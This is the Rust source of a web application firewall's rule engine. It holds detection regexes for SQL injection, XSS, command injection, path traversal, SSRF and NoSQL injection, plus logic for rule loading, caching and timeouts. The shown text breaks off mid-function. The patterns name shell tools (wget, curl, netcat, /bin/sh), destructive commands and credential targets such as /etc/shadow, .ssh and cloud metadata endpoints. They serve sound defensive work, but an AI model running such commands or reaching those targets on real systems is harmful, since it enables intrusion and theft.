//! Core WAF rule engine implementation.

use parking_lot::RwLock;
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::time::{Duration, Instant};

use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use base64::Engine as _;
use once_cell::sync::Lazy;
use percent_encoding::percent_decode_str;
use regex::{Regex, RegexBuilder};

/// Default timeout for rule evaluation (prevents DoS via complex regexes).
/// 50ms is sufficient for most requests while catching pathological cases.
pub const DEFAULT_EVAL_TIMEOUT: Duration = Duration::from_millis(50);

/// Maximum timeout allowed (prevents disabling protection).
pub const MAX_EVAL_TIMEOUT: Duration = Duration::from_millis(500);

/// Maximum compiled regex size (ReDoS protection).
/// 10MB limit prevents catastrophic memory/CPU usage from pathological patterns.
const REGEX_SIZE_LIMIT: usize = 10 * (1 << 20);

/// Maximum DFA size for regex matching (ReDoS protection).
/// Limits the state machine size to prevent exponential blowup.
const REGEX_DFA_SIZE_LIMIT: usize = 10 * (1 << 20);

/// Maximum recursion depth for condition evaluation.
const MAX_RECURSION_DEPTH: u32 = 10;

use crate::waf::index::{
    build_rule_index, get_candidate_rule_indices, method_to_mask, CandidateCache,
    CandidateCacheKey, RuleIndex, REQ_ARGS, REQ_ARG_ENTRIES, REQ_BODY, REQ_JSON,
};
use crate::waf::rule::{MatchCondition, MatchValue, WafRule};
use crate::waf::state::StateStore;
use crate::waf::types::{Action, EvalContext, Request, RiskContribution, Verdict};
use crate::waf::WafError;
use crate::waf::{TraceEvent, TraceSink, TraceState};

// Pre-compiled regex patterns for SQL/XSS detection
#[allow(dead_code)]
static BASE64_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2,3}=)?$").expect("base64 regex"));

static SQL_KEYWORDS: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"\b(load_file|into outfile)\b")
        .case_insensitive(true)
        .build()
        .expect("sql keywords regex")
});

static SQL_PHRASES: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(
        r"\b(insert\s+into|delete\s+from|drop\s+(table|database|view)|union\s+(all\s+)?select|select\s+\*\s+from|select\s+.*\s+from\s+information_schema)\b",
    )
    .case_insensitive(true)
    .build()
    .expect("sql phrases regex")
});

static SQL_OR_AND_EQ: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"(\bor\b|\band\b)\s+\d+=\d+")
        .case_insensitive(true)
        .build()
        .expect("sql or/and regex")
});

static SQL_COMMENT_1: Lazy<Regex> = Lazy::new(|| Regex::new(r"'\s*--").expect("sql comment 1"));
static SQL_COMMENT_2: Lazy<Regex> = Lazy::new(|| Regex::new(r#""\s*--"#).expect("sql comment 2"));
static SQL_SHUTDOWN: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r";\s*shutdown\b")
        .case_insensitive(true)
        .build()
        .expect("sql shutdown")
});

static XSS_SCRIPT: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"<\s*script\b")
        .case_insensitive(true)
        .build()
        .expect("xss script")
});
static XSS_JS_SCHEME: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"javascript:")
        .case_insensitive(true)
        .build()
        .expect("xss js scheme")
});
static XSS_ON_ATTR: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(
        r"\b(onload|onclick|onerror|onmouseover|onfocus|onblur|onsubmit|onchange|oninput|onkeydown|onkeyup|onkeypress|onmousedown|onmouseup|onmousemove|onmouseout|onresize|onscroll|onunload)\s*=",
    )
    .case_insensitive(true)
    .build()
    .expect("xss on attr")
});
static XSS_COOKIE: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"document\.cookie")
        .case_insensitive(true)
        .build()
        .expect("xss cookie")
});
static XSS_IMG_SRC: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"<\s*img[^>]+src")
        .case_insensitive(true)
        .build()
        .expect("xss img src")
});

// Command injection detection patterns
// SECURITY: These patterns detect OS command injection attempts

/// Backtick command execution: `cmd`
static CMD_BACKTICK: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"`[^`]+`").expect("cmd backtick regex"));

/// $() command substitution: $(cmd)
static CMD_SUBSHELL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\$\([^)]+\)").expect("cmd subshell regex"));

/// Variable substitution patterns: ${IFS}, ${PATH}, ${variable}
static CMD_VAR_SUBST: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\$\{[^}]+\}").expect("cmd var subst regex"));

/// IFS manipulation (common bypass technique)
static CMD_IFS: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"\$IFS|\$\{IFS\}|\bIFS\s*=")
        .case_insensitive(true)
        .build()
        .expect("cmd IFS regex")
});

/// Shell metacharacters for command chaining: ; | && ||
static CMD_CHAIN: Lazy<Regex> = Lazy::new(|| Regex::new(r"[;&|]{1,2}").expect("cmd chain regex"));

/// Brace expansion: {cmd1,cmd2}
static CMD_BRACE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\{[^}]*,[^}]*\}").expect("cmd brace regex"));

/// Common dangerous commands (with word boundaries to avoid false positives)
static CMD_DANGEROUS: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(
        r"\b(cat\s+/etc/|/etc/passwd|/etc/shadow|wget\s|curl\s|nc\s+-|ncat\s|netcat\s|bash\s+-|sh\s+-c|/bin/sh|/bin/bash|chmod\s+\+|chown\s|rm\s+-rf|mkfifo|mknod|python\s+-c|perl\s+-e|ruby\s+-e|php\s+-r|lua\s+-e|awk\s+|xargs\s)"
    )
    .case_insensitive(true)
    .build()
    .expect("cmd dangerous regex")
});

/// Encoded newline patterns (%0a, %0d, %0A, %0D)
static CMD_NEWLINE_ENCODED: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"%0[aAdD]")
        .case_insensitive(true)
        .build()
        .expect("cmd newline encoded regex")
});

/// Literal newline/carriage return in parameter values
static CMD_NEWLINE_LITERAL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"[\r\n]").expect("cmd newline literal regex"));

/// Redirection operators: > >> < 2>&1
static CMD_REDIRECT: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"[<>]{1,2}|2>&1|&>").expect("cmd redirect regex"));

/// Path traversal combined with command execution
static CMD_PATH_TRAVERSAL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\.{2,}/+").expect("cmd path traversal regex"));

/// Null byte injection (can truncate strings in some contexts)
static CMD_NULL_BYTE: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"%00|\\x00|\\0")
        .case_insensitive(true)
        .build()
        .expect("cmd null byte regex")
});

// Path traversal detection patterns
// SECURITY: These patterns detect directory traversal attacks including encoding bypasses

/// Basic path traversal: ../, ..\, ....//
static PATH_TRAV_BASIC: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\.{2,}[/\\]+|\.{2,}$").expect("path trav basic regex"));

/// URL-encoded path traversal: %2e%2e%2f, %2e%2e/, ..%2f
static PATH_TRAV_ENCODED: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"%2e%2e[%/\\]|\.\.%2f|\.\.%5c|%2e%2e$")
        .case_insensitive(true)
        .build()
        .expect("path trav encoded regex")
});

/// Double URL-encoded path traversal: %252e%252e%252f
static PATH_TRAV_DOUBLE: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"%25(?:2e|2E){2}%25(?:2f|2F|5c|5C)")
        .case_insensitive(true)
        .build()
        .expect("path trav double encoded regex")
});

/// Unicode/overlong UTF-8 encoded path traversal
/// %c0%ae = overlong encoding of '.'
/// %c0%af = overlong encoding of '/'
/// %c1%9c = overlong encoding of '\'
static PATH_TRAV_UNICODE: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"%c0%ae|%c0%af|%c1%9c|%c0%9v|%c1%1c|%c0%2e|%e0%80%ae|%f0%80%80%ae")
        .case_insensitive(true)
        .build()
        .expect("path trav unicode regex")
});

/// Backslash variants for Windows paths
static PATH_TRAV_BACKSLASH: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"\.\.\\|%5c%2e%2e|%2e%2e%5c")
        .case_insensitive(true)
        .build()
        .expect("path trav backslash regex")
});

/// Sensitive path targets (Unix)
static PATH_TRAV_TARGETS_UNIX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"/etc/(passwd|shadow|group|hosts|sudoers|ssh/|crontab)|/proc/|/dev/|/var/log/|/root/|\.ssh/|\.bash_history|\.env")
        .expect("path trav targets unix regex")
});

/// Sensitive path targets (Windows)
static PATH_TRAV_TARGETS_WIN: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(
        r"boot\.ini|win\.ini|system32|windows\\system|SAM|NTDS\.dit|web\.config|machine\.config",
    )
    .case_insensitive(true)
    .build()
    .expect("path trav targets win regex")
});

/// Null byte injection for path truncation: file.php%00.jpg
static PATH_TRAV_NULL: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"%00|\\x00|\\0|\x00")
        .case_insensitive(true)
        .build()
        .expect("path trav null regex")
});

// SSRF (Server-Side Request Forgery) detection patterns
// SECURITY: These patterns detect SSRF attempts targeting internal services and cloud metadata

/// IPv4 localhost patterns: 127.0.0.1, 127.0.0.0/8
static SSRF_LOCALHOST_V4: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?://|@)127\.(?:\d{1,3}\.){2}\d{1,3}(?:[:/]|$)")
        .expect("ssrf localhost v4 regex")
});

/// IPv6 localhost patterns: ::1, [::1], 0:0:0:0:0:0:0:1
static SSRF_LOCALHOST_V6: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?://|@)\[?(?:::1|0:0:0:0:0:0:0:1)\]?(?:[:/]|$)")
        .expect("ssrf localhost v6 regex")
});

/// IPv6-mapped IPv4 bypass attempts: ::ffff:127.0.0.1, ::ffff:169.254.169.254
static SSRF_MAPPED_IPV6: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?://|@)\[?::ffff:(?:\d{1,3}\.){3}\d{1,3}\]?(?:[:/]|$)")
        .expect("ssrf mapped ipv6 regex")
});

/// Cloud metadata endpoints: 169.254.169.254, 169.254.170.2 (AWS ECS)
static SSRF_CLOUD_METADATA: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?://|@)169\.254\.(?:169\.254|170\.2)(?:[:/]|$)")
        .expect("ssrf cloud metadata regex")
});

/// AWS/GCP/Azure metadata hostnames
static SSRF_METADATA_HOST: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"(?://|@)(?:metadata\.google\.internal|metadata\.azure\.com|instance-data\.ec2\.internal|169\.254\.169\.254)")
        .case_insensitive(true)
        .build()
        .expect("ssrf metadata host regex")
});

/// Private IPv4 ranges: 10.x.x.x, 192.168.x.x, 172.16-31.x.x
static SSRF_PRIVATE_IP: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?://|@)(?:10\.(?:\d{1,3}\.){2}\d{1,3}|192\.168\.(?:\d{1,3}\.)\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.(?:\d{1,3}\.)\d{1,3})(?:[:/]|$)")
        .expect("ssrf private ip regex")
});

/// Link-local addresses: 169.254.0.0/16 (excluding cloud metadata which is handled separately)
static SSRF_LINK_LOCAL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?://|@)169\.254\.(?:\d{1,3}\.)\d{1,3}(?:[:/]|$)")
        .expect("ssrf link local regex")
});

/// Dangerous URL schemes that can be used for SSRF
/// file://, gopher://, dict://, ldap://, expect://, php://, data:, jar://
/// Note: data: URIs don't use // so we match data: separately
static SSRF_DANGEROUS_SCHEME: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"(?:^|[^a-z0-9])(?:(?:file|gopher|dict|ldap|ldaps|expect|php|phar|jar|ftp|tftp|ssh2)://|data:)")
        .case_insensitive(true)
        .build()
        .expect("ssrf dangerous scheme regex")
});

/// Decimal/octal/hex IP encoding bypasses: 2130706433, 0x7f000001, 017700000001
static SSRF_ENCODED_IP: Lazy<Regex> = Lazy::new(|| {
    // Decimal localhost: 2130706433 = 127.0.0.1
    // Hex localhost: 0x7f000001 = 127.0.0.1
    // Octal localhost: 017700000001 (varies by system)
    Regex::new(r"(?i)(?://|@)(?:0x[0-9a-f]{8}|2130706433|017700000001|\d{8,10})(?:[:/]|$)")
        .expect("ssrf encoded ip regex")
});

// NoSQL Injection detection patterns
// SECURITY: These patterns detect MongoDB, CouchDB, and other NoSQL injection attacks

/// MongoDB operator injection: $where, $ne, $gt, $lt, $gte, $lte, $in, $nin, $regex, etc.
static NOSQL_MONGO_OPERATORS: Lazy<Regex> = Lazy::new(|| {
    // Match MongoDB operators in JSON context with various quote styles
    Regex::new(r#"(?i)["\']?\$(?:where|ne|gt|lt|gte|lte|in|nin|regex|exists|type|mod|all|size|elemMatch|meta|slice|comment|rand|natural|or|and|not|nor|expr|jsonSchema|text|geoWithin|geoIntersects|near|nearSphere)["\']?\s*:"#)
        .expect("nosql mongo operators regex")
});

/// MongoDB $where JavaScript execution (HIGH RISK)
static NOSQL_WHERE_JS: Lazy<Regex> = Lazy::new(|| {
    // Match $where with function or JavaScript code
    Regex::new(r#"(?i)["\']?\$where["\']?\s*:\s*["\']?(?:function\s*\(|this\.|sleep\(|db\.|new\s+Date|tojson|printjson)"#)
        .expect("nosql where js regex")
});

/// MongoDB authentication bypass: {"password": {"$ne": null}}
static NOSQL_AUTH_BYPASS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:password|passwd|pwd|user|username|login|email)["\']?\s*:\s*\{\s*["\']?\$(?:ne|gt|lt|gte|lte|exists)["\']?\s*:"#)
        .expect("nosql auth bypass regex")
});

/// MongoDB aggregation pipeline injection
static NOSQL_AGGREGATION: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)["\']?\$(?:lookup|unwind|group|project|match|sort|limit|skip|out|merge|addFields|replaceRoot)["\']?\s*:"#)
        .expect("nosql aggregation regex")
});

/// CouchDB injection patterns: _all_docs, _view, _design
static NOSQL_COUCHDB: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(?:_all_docs|_design/|_view/|_changes|_bulk_docs|_find)")
        .expect("nosql couchdb regex")
});

/// Redis command injection patterns
static NOSQL_REDIS: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(r"\b(?:EVAL|EVALSHA|SCRIPT|DEBUG|FLUSHALL|FLUSHDB|CONFIG|SHUTDOWN|SLAVEOF|REPLICAOF|MIGRATE|DUMP|RESTORE|KEYS|SCAN)\b")
        .case_insensitive(true)
        .build()
        .expect("nosql redis regex")
});

/// Cassandra CQL injection patterns
static NOSQL_CASSANDRA: Lazy<Regex> = Lazy::new(|| {
    RegexBuilder::new(
        r"\b(?:ALLOW\s+FILTERING|USING\s+TTL|USING\s+TIMESTAMP|TOKEN\s*\(|WRITETIME\s*\()\b",
    )
    .case_insensitive(true)
    .build()
    .expect("nosql cassandra regex")
});

/// JSON injection patterns (prototype pollution, __proto__)
static JSON_PROTO_POLLUTION: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)["\']?(?:__proto__|constructor|prototype)["\']?\s*:"#)
        .expect("json proto pollution regex")
});

/// Match kinds whose values are not available during the body-phase WAF pass.
/// Rules containing any of these are evaluated in a separate deferred pass
/// after the DLP scanner completes.
const DEFERRED_MATCH_KINDS: &[&str] = &["dlp_violation"];

/// Compiled rules and indices for fast swapping (labs-tui optimization).
pub struct CompiledRules {
    pub rules: Vec<WafRule>,
    pub rule_id_to_index: HashMap<u32, usize>,
    pub rule_index: RuleIndex,
    pub regex_cache: HashMap<String, Regex>,
    pub word_regex_cache: HashMap<String, Regex>,
    /// Indices of rules that must be evaluated in the deferred pass
    /// (because they reference a match kind with data unavailable during
    /// the body-phase pass, e.g. `dlp_violation`).
    pub deferred_rule_indices: Vec<usize>,
}

/// Main WAF rule engine.
pub struct Engine {
    rules: Vec<WafRule>,
    rule_id_to_index: HashMap<u32, usize>,
    rule_index: RuleIndex,
    regex_cache: HashMap<String, Regex>,
    word_regex_cache: HashMap<String, Regex>,
    store: RwLock<StateStore>,
    candidate_cache: RwLock<CandidateCache>,
    /// Maximum risk score (100.0 default, 1000.0 for extended range).
    max_risk: RwLock<f64>,
    /// Whether to apply repeat offender multipliers.
    enable_repeat_multipliers: RwLock<bool>,
    /// Sorted indices of rules handled by the deferred post-DLP pass.
    /// Used to skip them during body-phase evaluation and to scope the
    /// deferred pass.
    deferred_rule_indices: Vec<usize>,
    /// Rule ids mirroring `deferred_rule_indices`, for O(1) skip checks
    /// during body-phase iteration.
    deferred_rule_id_set: HashSet<u32>,
}

impl Engine {
    /// Create an empty engine with no rules.
    pub fn empty() -> Self {
        Self {
            rules: Vec::new(),
            rule_id_to_index: HashMap::new(),
            rule_index: RuleIndex::default(),
            regex_cache: HashMap::new(),
            word_regex_cache: HashMap::new(),
            store: RwLock::new(StateStore::default()),
            candidate_cache: RwLock::new(CandidateCache::new(2048)),
            max_risk: RwLock::new(100.0),
            enable_repeat_multipliers: RwLock::new(true),
            deferred_rule_indices: Vec::new(),
            deferred_rule_id_set: HashSet::new(),
        }
    }

    /// Set maximum risk score (100.0 default, 1000.0 for extended range).
    pub fn set_max_risk(&self, max_risk: f64) {
        *self.max_risk.write() = max_risk;
    }

    /// Get maximum risk score.
    pub fn max_risk(&self) -> f64 {
        *self.max_risk.read()
    }

    /// Enable or disable repeat offender multipliers.
    pub fn set_repeat_multipliers(&self, enabled: bool) {
        *self.enable_repeat_multipliers.write() = enabled;
    }

    /// Load rules from JSON bytes.
    pub fn load_rules(&mut self, json: &[u8]) -> Result<usize, WafError> {
        let compiled = self.precompute_rules(json)?;
        let count = compiled.rules.len();
        self.reload_from_compiled(compiled);
        Ok(count)
    }

    /// Precompute all rule structures including regex compilation.
    ///
    /// This is an expensive operation that should happen outside of global locks.
    pub fn precompute_rules(&self, json: &[u8]) -> Result<CompiledRules, WafError> {
        let rules: Vec<WafRule> =
            serde_json::from_slice(json).map_err(|e| WafError::ParseError(e.to_string()))?;

        let rule_id_to_index = rules
            .iter()
            .enumerate()
            .map(|(idx, rule)| (rule.id, idx))
            .collect();

        let rule_index = build_rule_index(&rules);

        let mut regex_cache = HashMap::new();
        let mut word_regex_cache = HashMap::new();

        // Pre-compile regex patterns
        let mut patterns = Vec::<String>::new();
        let mut words = Vec::<String>::new();
        for rule in &rules {
            for cond in &rule.matches {
                collect_regex_patterns(cond, &mut patterns);
                collect_word_values(cond, &mut words);
            }
        }

        patterns.sort();
        patterns.dedup();
        for pattern in patterns {
            let compiled = RegexBuilder::new(&pattern)
                .multi_line(true)
                .size_limit(REGEX_SIZE_LIMIT)
                .dfa_size_limit(REGEX_DFA_SIZE_LIMIT)
                .build()
                .map_err(|e| WafError::RegexError(format!("'{pattern}': {e}")))?;
            regex_cache.insert(pattern, compiled);
        }

        words.sort();
        words.dedup();
        for word in words {
            let pattern = format!(r"(?i)\b{}\b", regex::escape(&word));
            let compiled = RegexBuilder::new(&pattern)
                .multi_line(true)
                .size_limit(REGEX_SIZE_LIMIT)
                .dfa_size_limit(REGEX_DFA_SIZE_LIMIT)
                .build()
                .map_err(|e| WafError::RegexError(format!("word '{word}': {e}")))?;
            word_regex_cache.insert(word, compiled);
        }

        let deferred_rule_indices = compute_deferred_rule_indices(&rules);

        Ok(CompiledRules {
            rules,
            rule_id_to_index,
            rule_index,
            regex_cache,
            word_regex_cache,
            deferred_rule_indices,
        })
    }

    /// Fast swap of rule state using precomputed data.
    pub fn reload_from_compiled(&mut self, compiled: CompiledRules) {
        self.rules = compiled.rules;
        self.rule_id_to_index = compiled.rule_id_to_index;
        self.rule_index = compiled.rule_index;
        self.regex_cache = compiled.regex_cache;
        self.word_regex_cache = compiled.word_regex_cache;
        self.deferred_rule_indices = compiled.deferred_rule_indices;
        self.deferred_rule_id_set = self
            .deferred_rule_indices
            .iter()
            .map(|&i| self.rules[i].id)
            .collect();
        self.candidate_cache.write().clear();
    }

    /// Parse rules from JSON bytes without modifying engine state.
    pub fn parse_rules(json: &[u8]) -> Result<Vec<WafRule>, WafError> {
        serde_json::from_slice(json).map_err(|e| WafError::ParseError(e.to_string()))
    }

    /// Reload the engine with a new set of rules.
    pub fn reload_rules(&mut self, rules: Vec<WafRule>) -> Result<(), WafError> {
        self.rules = rules;
        self.rule_id_to_index = self
            .rules
            .iter()
            .enumerate()
            .map(|(idx, rule)| (rule.id, idx))
            .collect();
        self.rule_index = build_rule_index(&self.rules);
        self.deferred_rule_indices = compute_deferred_rule_indices(&self.rules);
        self.deferred_rule_id_set = self
            .deferred_rule_indices
            .iter()
            .map(|&i| self.rules[i].id)
            .collect();
        self.candidate_cache.write().clear();
        self.regex_cache.clear();
        self.word_regex_cache.clear();

        // Pre-compile regex patterns
        let mut patterns = Vec::<String>::new();
        let mut words = Vec::<String>::new();
        for rule in &self.rules {
            for cond in &rule.matches {
                collect_regex_patterns(cond, &mut patterns);
                collect_word_values(cond, &mut words);
            }
        }

        patterns.sort();
        patterns.dedup();
        for pattern in patterns {
            let compiled = RegexBuilder::new(&pattern)
                .multi_line(true)
                .size_limit(REGEX_SIZE_LIMIT)
                .dfa_size_limit(REGEX_DFA_SIZE_LIMIT)
                .build()
                .map_err(|e| WafError::RegexError(format!("'{pattern}': {e}")))?;
            self.regex_cache.insert(pattern, compiled);
        }

        words.sort();
        words.dedup();
        for word in words {
            let pattern = format!(r"(?i)\b{}\b", regex::escape(&word));
            let compiled = RegexBuilder::new(&pattern)
                .multi_line(true)
                .size_limit(REGEX_SIZE_LIMIT)
                .dfa_size_limit(REGEX_DFA_SIZE_LIMIT)
                .build()
                .map_err(|e| WafError::RegexError(format!("word '{word}': {e}")))?;
            self.word_regex_cache.insert(word, compiled);
        }

        Ok(())
    }

    /// Get the number of loaded rules.
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Analyze a request and return a verdict.
    pub fn analyze(&self, req: &Request) -> Verdict {
        let ctx = EvalContext::from_request(req);
        let mut trace_state = TraceState::disabled();
        self.evaluate_with_trace(&ctx, &mut trace_state)
    }

    /// Analyze a request and emit evaluation trace events.
    pub fn analyze_with_trace(&self, req: &Request, trace: &mut dyn TraceSink) -> Verdict {
        let ctx = EvalContext::from_request(req);
        let mut trace_state = TraceState::enabled(trace);
        let start = Instant::now();
        let verdict = self.evaluate_with_trace(&ctx, &mut trace_state);
        let detection_time_us = start.elapsed().as_micros() as u64;

        if trace_state.is_enabled() {
            trace_state.emit(TraceEvent::EvaluationFinished {
                verdict: if matches!(verdict.action, Action::Block) {
                    "block".to_string()
                } else {
                    "allow".to_string()
                },
                risk_score: verdict.risk_score,
                matched_rules: verdict.matched_rules.clone(),
                timed_out: verdict.timed_out,
                rules_evaluated: verdict.rules_evaluated,
                detection_time_us,
            });
        }

        verdict
    }

    /// Analyze a request with a timeout to prevent DoS via complex regexes.
    ///
    /// # Arguments
    /// * `req` - The request to analyze
    /// * `timeout` - Maximum time allowed for rule evaluation (capped at MAX_EVAL_TIMEOUT)
    ///
    /// # Returns
    /// A `Verdict` with `timed_out=true` if evaluation exceeded the deadline.
    /// Partial results (rules evaluated before timeout) are still included.
    pub fn analyze_with_timeout(&self, req: &Request, timeout: Duration) -> Verdict {
        let effective_timeout = timeout.min(MAX_EVAL_TIMEOUT);
        let deadline = Instant::now() + effective_timeout;
        let ctx = EvalContext::from_request_with_deadline(req, deadline);
        let mut trace_state = TraceState::disabled();
        self.evaluate_with_trace(&ctx, &mut trace_state)
    }

    /// Analyze a request with the default timeout (DEFAULT_EVAL_TIMEOUT).
    pub fn analyze_safe(&self, req: &Request) -> Verdict {
        self.analyze_with_timeout(req, DEFAULT_EVAL_TIMEOUT)
    }

    /// Evaluate only the rules tagged as deferred (currently: rules that
    /// reference `dlp_violation`). The caller is expected to populate
    /// `req.dlp_matches` before calling this.
    ///
    /// Rules evaluated here are excluded from the normal `analyze`/`analyze_with_timeout`
    /// candidate set, so there is no risk of double-matching.
    pub fn analyze_deferred_with_timeout(&self, req: &Request, timeout: Duration) -> Verdict {
        if self.deferred_rule_indices.is_empty() {
            return Verdict::default();
        }
        let effective_timeout = timeout.min(MAX_EVAL_TIMEOUT);
        let deadline = Instant::now() + effective_timeout;
        let ctx = EvalContext::from_request_with_deadline(req, deadline);
        let mut trace_state = TraceState::disabled();
        self.evaluate_subset(&ctx, &self.deferred_rule_indices, &mut trace_state)
    }

    fn evaluate_subset(
        &self,
        ctx: &EvalContext,
        rule_indices: &[usize],
        trace: &mut TraceState,
    ) -> Verdict {
        let mut matched_rules = Vec::new();
        let mut total_risk = 0.0;
        let mut should_block = false;
        let mut timed_out = false;
        let mut rules_evaluated: u32 = 0;

        let max_risk = *self.max_risk.read();

        for &rule_idx in rule_indices.iter() {
            if ctx.is_deadline_exceeded() {
                timed_out = true;
                break;
            }
            let rule = &self.rules[rule_idx];
            rules_evaluated += 1;
            let matched = self.eval_rule(rule, ctx, trace);
            if matched {
                matched_rules.push(rule.id);
                total_risk += rule.effective_risk();
                if rule.blocking.unwrap_or(false) {
                    should_block = true;
                }
            }
        }

        let risk_score = total_risk.min(max_risk).max(0.0) as u16;

        Verdict {
            action: if should_block {
                Action::Block
            } else {
                Action::Allow
            },
            risk_score,
            matched_rules,
            entity_risk: 0.0,
            entity_blocked: false,
            block_reason: if should_block {
                Some("Rule-based block (deferred)".to_string())
            } else if timed_out {
                Some("Deferred evaluation timeout (partial result)".to_string())
            } else {
                None
            },
            risk_contributions: Vec::new(),
            endpoint_template: None,
            endpoint_risk: None,
            anomaly_score: None,
            adjusted_threshold: None,
            anomaly_signals: Vec::new(),
            timed_out,
            rules_evaluated: if timed_out {
                Some(rules_evaluated)
            } else {
                None
            },
        }
    }

    fn evaluate_with_trace(&self, ctx: &EvalContext, trace: &mut TraceState) -> Verdict {
        let mut matched_rules = Vec::new();
        let mut total_risk = 0.0;
        let mut should_block = false;
        let mut timed_out = false;
        let mut rules_evaluated: u32 = 0;
        let risk_contributions: Vec<RiskContribution> = Vec::new();

        // Get risk config
        let max_risk = *self.max_risk.read();
        let _enable_multipliers = *self.enable_repeat_multipliers.read();

        // Get candidate rules using index
        let method_bit = method_to_mask(ctx.method).unwrap_or(0);
        let uri = ctx.url;
        let available_features = compute_available_features(ctx);
        let header_mask = compute_request_header_mask(&self.rule_index, &ctx.headers);
        let cache_key = CandidateCacheKey {
            method_bit,
            available_features,
            is_static: ctx.is_static,
            header_mask,
        };

        // Try reading from cache first (requires write lock due to LRU tracking)
        let cached = self.candidate_cache.write().get(&cache_key, uri);
        let candidates: Arc<[usize]> = match cached {
            Some(v) => v,
            None => {
                // Compute and write to cache
                let computed = get_candidate_rule_indices(
                    &self.rule_index,
                    method_bit,
                    uri,
                    available_features,
                    ctx.is_static,
                    header_mask,
                    self.rules.len(),
                    safe_percent_decode,
                );
                let candidates: Arc<[usize]> = Arc::from(computed);
                self.candidate_cache
                    .write()
                    .insert(cache_key, uri.to_string(), candidates.clone());
                candidates
            }
        };

        if trace.is_enabled() {
            trace.emit(TraceEvent::EvaluationStarted {
                method: ctx.method.to_string(),
                uri: ctx.url.to_string(),
                candidate_rules: candidates.len(),
            });
        }

        // Evaluate each candidate rule with timeout checking
        for &rule_idx in candidates.iter() {
            // Check deadline before each rule evaluation
            if ctx.is_deadline_exceeded() {
                timed_out = true;
                break;
            }

            let rule = &self.rules[rule_idx];
            // Skip rules handled by the deferred post-DLP pass so we don't
            // evaluate them twice (or match them here with an empty dlp context).
            if self.deferred_rule_id_set.contains(&rule.id) {
                continue;
            }
            rules_evaluated += 1;

            if trace.is_enabled() {
                trace.emit(TraceEvent::RuleStart { rule_id: rule.id });
            }

            let matched = self.eval_rule(rule, ctx, trace);

            if trace.is_enabled() {
                trace.emit(TraceEvent::RuleEnd {
                    rule_id: rule.id,
                    matched,
                    risk: rule.effective_risk(),
                    blocking: rule.blocking.unwrap_or(false),
                });
            }

            if matched {
                matched_rules.push(rule.id);
                total_risk += rule.effective_risk();
                if rule.blocking.unwrap_or(false) {
                    should_block = true;
                }
            }
        }

        // Compute risk score (clamped to max_risk)
        let risk_score = total_risk.min(max_risk).max(0.0) as u16;

        Verdict {
            action: if should_block {
                Action::Block
            } else {
                Action::Allow
            },
            risk_score,
            matched_rules,
            entity_risk: 0.0,
            entity_blocked: false,
            block_reason: if should_block {
                Some("Rule-based block".to_string())
            } else if timed_out {
                Some("Evaluation timeout (partial result)".to_string())
            } else {
                None
            },
            risk_contributions,
            endpoint_template: None,
            endpoint_risk: None,
            anomaly_score: None,
            adjusted_threshold: None,
            anomaly_signals: Vec::new(),
            timed_out,
            rules_evaluated: if timed_out {
                Some(rules_evaluated)
            } else {
                None
            },
        }
    }

    fn eval_rule(&self, rule: &WafRule, ctx: &EvalContext, trace: &mut TraceState) -> bool {
        for cond in &rule.matches {
            if !self.eval_condition(cond, ctx, None, trace, rule.id, 0) {
                return false;
            }
        }
        true
    }

    fn eval_condition(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        value: Option<&str>,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        if depth >= MAX_RECURSION_DEPTH {
            return false;
        }

        let matched = match condition.kind.as_str() {
            "boolean" => self.eval_boolean(condition, ctx, value, trace, rule_id, depth),
            "method" => self.eval_method(condition, ctx, trace, rule_id, depth),
            "uri" => self.eval_uri(condition, ctx, trace, rule_id, depth),
            "args" => self.eval_args(condition, ctx, trace, rule_id, depth),
